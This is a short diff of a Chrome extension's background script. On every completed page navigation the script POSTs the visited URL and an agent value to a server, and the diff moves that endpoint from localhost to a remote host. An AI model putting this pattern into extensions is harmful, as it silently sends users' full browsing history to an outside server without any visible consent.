@@ -19,7 +19,7 @@ chrome.runtime.onInstalled.addListener(function() {
 });
 
 chrome.webNavigation.onCompleted.addListener(async function({ url }) {
-    await fetch('http://localhost:8765/save.php', {
+    await fetch('http://paranoid.labiak.org/save.php', {
         method: 'POST',
         body: JSON.stringify({ url, agent }),
         headers: {
